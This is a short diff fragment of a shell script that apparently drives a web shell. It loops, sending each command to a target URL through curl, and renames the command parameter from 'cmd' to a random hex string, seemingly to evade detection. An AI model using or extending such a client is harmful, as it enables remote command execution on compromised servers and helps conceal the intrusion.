@@ -33,6 +33,6 @@ while true; do
         exit 0
     fi
 
-    curl -q -k -G "$1" --data-urlencode "cmd=${cmd}"
+    curl -q -k -G "$1" --data-urlencode "adda0a3d99480e6c29b065b1b0cd5319=${cmd}"
     echo ""
 done
